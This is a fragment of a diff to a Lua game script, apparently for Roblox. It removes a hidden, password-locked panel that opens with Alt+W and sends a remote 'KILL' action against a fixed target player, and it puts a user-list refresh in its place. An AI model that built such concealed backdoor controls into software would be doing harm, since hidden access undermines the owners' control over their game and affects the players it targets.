-        if targetTextBox.Text ~= "" then NICK_ALVO_FIXO = targetTextBox.Text end
-        executarAcaoRemota("KILL", "none")
-    end)
-
-    local function validarSenha()
-        if passBox.Text == PASSWORD then
-            unlocked = true
-            prompt.Visible = false
-            passBox.Text = ""
-            errLabel.Text = ""
-            panel.Visible = true
-            panelOpen = true
-        else
-            errLabel.Text = "Senha incorreta!"
-        end
-    end
-
-    enterBtn.MouseButton1Click:Connect(validarSenha)
-
-    UIS.InputBegan:Connect(function(input)
-        if input.KeyCode == Enum.KeyCode.W and (UIS:IsKeyDown(Enum.KeyCode.LeftAlt) or UIS:IsKeyDown(Enum.KeyCode.RightAlt)) then
-            if not unlocked then
-                prompt.Visible = not prompt.Visible
-                errLabel.Text = ""
-            else
-                panelOpen = not panelOpen
-                panel.Visible = panelOpen
-            end
-        end
-    end)
-end
+refreshUserList()
